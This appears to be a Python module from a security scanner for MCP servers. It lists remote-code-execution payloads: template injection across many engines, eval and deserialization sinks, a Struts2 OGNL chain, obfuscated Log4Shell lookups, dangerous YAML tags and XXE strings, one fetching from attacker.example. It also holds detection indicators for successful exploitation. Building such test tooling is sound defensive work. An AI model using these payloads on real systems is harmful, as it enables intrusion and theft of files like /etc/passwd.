"""Remote code execution payloads for R2.

Command-injection is already covered by ``command_injection.py``. This
module targets higher-level code-execution vectors that don't go through
a shell: template engines, ``eval``/``exec`` sinks, insecure
deserialisation, expression languages, and JNDI lookups. MCP servers
that wrap LLM prompt templates, config files, or plugin systems are the
likely victims.

Payload categories:

* ``ssti``         — Jinja2, Twig, Freemarker, ERB, Velocity, Smarty,
                      Pebble, Thymeleaf, Mako, Handlebars
* ``eval_python``  — Python ``eval``/``exec`` / ``pickle`` sinks
* ``eval_js``      — Node ``Function``/``vm`` / ``child_process`` sinks
* ``eval_ruby``    — Ruby ``eval``/``send``/``Marshal`` sinks
* ``eval_php``     — PHP ``eval``/``assert``/``preg_replace`` sinks
* ``eval_perl``    — Perl ``eval``/string-mode regex
* ``expr_lang``    — SpEL, OGNL, MVEL, EL2 expression-language sinks
* ``jndi``         — Log4Shell-style ``${jndi:...}`` lookups
* ``deserialize``  — base64-wrapped pickle / Java / .NET / Ruby Marshal
* ``yaml_load``    — PyYAML / Ruby YAML.load object instantiation
* ``xxe``          — XML external entity expansion (R1+R2 overlap)
"""

from __future__ import annotations

# Canary that should appear in a response iff the payload was evaluated.
CANARY = "RCE_CANARY_7f3a9c"
# 1337 * 7 = 9359 — distinctive enough to flag arithmetic evaluation.
MATH_CANARY = "9359"

PAYLOADS: dict[str, list[str]] = {
    "ssti": [
        # Jinja2 / Flask
        "{{7*1337}}",
        "{{'" + CANARY + "'}}",
        "{{config.items()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{ namespace.__init__.__globals__.os.popen('echo " + CANARY + "').read() }}",
        "{{ lipsum.__globals__['os'].popen('id').read() }}",

        # Django templates
        "{% load os %}{% os.system 'id' %}",
        "{{ settings.SECRET_KEY }}",
        "{% debug %}",

        # Twig (Symfony)
        "{{_self.env.registerUndefinedFilterCallback('exec')}}",
        "{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{['cat /etc/passwd']|map('system')|join}}",

        # Smarty
        "{system('id')}",
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[c]); ?>',self::clearConfig())}",

        # Freemarker (Java)
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",[\"id\"]).start()}",
        "<#assign cl='freemarker.template.utility.JythonRuntime'?new()>${cl(\"import os;os.system('id')\")}",

        # Velocity (Java)
        "#set($x=1337*7)${x}",
        "#set($s='')#set($stringClass=$s.getClass())#set($run=$stringClass.forName('java.lang.Runtime'))$run.getRuntime().exec('id')",

        # Pebble
        "{{ {'a':'A'}.size() }}",
        "{% set cmd = 'id' %}{{ cmd }}",
        "{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}",

        # Thymeleaf
        "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",

        # ERB / Ruby
        "<%= 7*1337 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= File.open('/etc/passwd').read %>",

        # Mako (Python)
        "<% import os; os.system('echo " + CANARY + "') %>",
        "${self.module.cache.util.os.system('id')}",

        # Handlebars (JS)
        "{{#with \"constructor\"}}{{#with split as |a|}}{{pop (push \"\")}}{{/with}}{{/with}}",
        "{{#with this as |obj|}}{{lookup obj 'constructor'}}{{/with}}",

        # Tornado
        "{% import os %}{{os.system('id')}}",

        # AngularJS client-side template injection
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
    ],
    "eval_python": [
        "__import__('os').system('echo " + CANARY + "')",
        "__import__('os').popen('id').read()",
        "eval(\"1337*7\")",
        "exec(\"print('" + CANARY + "')\")",
        "eval(compile('import os; os.system(\"id\")','','exec'))",
        "1337*7",
        "().__class__.__bases__[0].__subclasses__()",
        "().__class__.__mro__[-1].__subclasses__()[40]('/etc/passwd').read()",
        "[c for c in ().__class__.__mro__[1].__subclasses__() if 'Popen' in str(c)]",
        # AST-bypass classics
        "(lambda: __import__('os').system('id'))()",
        "getattr(__builtins__,'eval')('1337*7')",
        "type(1)(__import__('os').system('id'))",
    ],
    "eval_js": [
        "1337*7",
        "${1337*7}",
        "process.mainModule.require('child_process').execSync('id').toString()",
        "require('child_process').execSync('echo " + CANARY + "').toString()",
        "global.process.mainModule.require('child_process').execSync('id')",
        "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')",
        "Function('return process.mainModule.require(\"child_process\").execSync(\"id\")')()",
        "(()=>{return this})().process.mainModule.require('child_process').execSync('id')",
        "Object.getOwnPropertyDescriptor(Object.getPrototypeOf({}),'__proto__').get.call({})",
        # vm sandbox escapes
        "this.constructor.constructor('return this')().process.exit()",
    ],
    "eval_ruby": [
        # Eval sinks
        "system('echo " + CANARY + "')",
        "`id`",
        "%x(id)",
        "Kernel.exec('id')",
        "eval('1337*7')",
        "send(:eval, 'system(\"id\")')",
        # Open-uri / IO.popen abuse
        "IO.popen('id').read",
        "open('|id').read",
        # ERB injection (handled in SSTI but a Ruby-side variant)
        "ERB.new('<%= `id` %>').result",
    ],
    "eval_php": [
        "<?php system('id'); ?>",
        "<?php echo `id`; ?>",
        "<?php passthru('id'); ?>",
        "<?php phpinfo(); ?>",
        "system('echo " + CANARY + "')",
        # preg_replace /e modifier (legacy, but still seen)
        "/.*/e",
        # assert() abuse
        "assert(\"system('id')\")",
        # create_function (deprecated, sometimes still around)
        "create_function('','system(\"id\");')",
        # Type juggling
        "0e123456789012345678901234567890",
    ],
    "eval_perl": [
        "system('id')",
        "`id`",
        "qx{id}",
        "open(F,'|-','id')",
        "eval { system('echo " + CANARY + "') }",
        # String regex /e
        "s/.*/system('id')/e",
    ],
    "expr_lang": [
        # SpEL (Spring)
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "${new java.lang.ProcessBuilder('id').start()}",

        # OGNL (Struts2)
        "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",

        # MVEL
        "Runtime.getRuntime().exec(\"id\")",

        # JEXL
        "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",

        # EL (Java EE)
        "${pageContext.request.getSession().setAttribute('a','b')}",
    ],
    "jndi": [
        "${jndi:ldap://127.0.0.1:1389/" + CANARY + "}",
        "${jndi:rmi://127.0.0.1:1099/" + CANARY + "}",
        "${jndi:dns://127.0.0.1/" + CANARY + "}",
        "${jndi:ldaps://127.0.0.1:1389/" + CANARY + "}",
        "${jndi:corba:iiop://127.0.0.1:1050/" + CANARY + "}",
        "${jndi:iiop://127.0.0.1:1050/" + CANARY + "}",
        # Lower-case bypass
        "${${lower:j}ndi:ldap://127.0.0.1/a}",
        "${${upper:j}${lower:n}di:ldap://127.0.0.1/a}",
        # Env-var expansion bypass
        "${${env:ENV_NAME:-j}ndi:ldap://127.0.0.1/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1/a}",
        # Sys-property bypass
        "${${sys:os.name:-j}ndi:ldap://127.0.0.1/a}",
        # Date pattern bypass
        "${${date:'j'}ndi:ldap://127.0.0.1/a}",
        # Nested
        "${${${::-j}${::-n}}di:ldap://127.0.0.1/a}",
    ],
    "deserialize": [
        # Base64-wrapped Python pickle of: posix.system('echo RCE_CANARY')
        "gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhlY2hvIFJDRV9DQU5BUllflIWUUpQu",
        # Java serialised-object header magic bytes (hex preview)
        "aced00057372",
        # Ruby Marshal magic bytes
        "\x04\x08",
        # .NET BinaryFormatter header preview (base64)
        "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0",
        # PHP serialised
        "O:8:\"stdClass\":1:{s:4:\"name\";s:6:\"pwned!\";}",
        # YAML-tagged Python object
        "!!python/object/apply:os.system ['echo " + CANARY + "']",
        "!!python/object/apply:subprocess.check_output [['id']]",
        "!!python/object/new:os.system ['id']",
        # Ruby YAML.load
        "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader::Entry\n    read: 0",
    ],
    "yaml_load": [
        # PyYAML dangerous tags (yaml.load without SafeLoader)
        "!!python/object/apply:os.system ['echo " + CANARY + "']",
        "!!python/object/apply:subprocess.Popen [['/bin/sh','-c','id']]",
        "!!python/object/new:tuple [[!!python/tuple [1,2]]]",
        "!!python/name:os.system",
        "!!python/module:os",
    ],
    "xxe": [
        # Classic in-band XXE
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY a SYSTEM 'file:///etc/passwd'>]><x>&a;</x>",
        # Out-of-band XXE
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % a SYSTEM 'http://attacker.example/x.dtd'> %a;]><x/>",
        # Parameter-entity for blind XXE
        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % p SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>%p;]><x/>",
        # Billion laughs (overlaps with R6 stability)
        "<?xml version='1.0'?><!DOCTYPE l [<!ENTITY a 'a'><!ENTITY b '&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;'><!ENTITY c '&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;'>]><l>&c;</l>",
        # SVG XXE
        "<?xml version='1.0' standalone='yes'?><!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><svg xmlns='http://www.w3.org/2000/svg'><text>&x;</text></svg>",
    ],
}


def generate_rce_payloads() -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    for category, values in PAYLOADS.items():
        for v in values:
            out.append(("rce_" + category, v))
    return out


# ---------------------------------------------------------------------------
# Response-side indicators
# ---------------------------------------------------------------------------

RCE_INDICATORS: list[str] = [
    CANARY,
    MATH_CANARY,
    "uid=",
    "gid=",
    "groups=",
    # Jinja/SSTI internal leaks
    "flask.config",
    "<class 'type'>",
    "<class 'object'>",
    "Subclasses of",
    # Java SSTI / deserialisation leaks
    "java.lang.Runtime",
    "java.lang.ProcessBuilder",
    "java.io.IOException",
    "freemarker.template",
    "org.apache.velocity",
    # Pickle / YAML errors that prove the loader processed our payload
    "pickle.UnpicklingError",
    "yaml.constructor.ConstructorError",
    "YAML object",
    # PHP markers
    "phpinfo()",
    "PHP Version",
    "uname -a",
    # XXE leaks
    "root:x:0:0",
    "PUBLIC \"-//",
]


def looks_like_rce_success(response_text: str) -> bool:
    # Strip framework-specific input echoes (Pydantic ``input_value=...``,
    # jsonschema ``instance: ...``) so canary strings that merely reflect the
    # payload don't get counted as code-execution evidence.
    from mcp_dynamic_analyzer.payloads._response_filters import strip_input_echoes
    cleaned = strip_input_echoes(response_text)
    for ind in RCE_INDICATORS:
        if ind in cleaned:
            return True
    return False
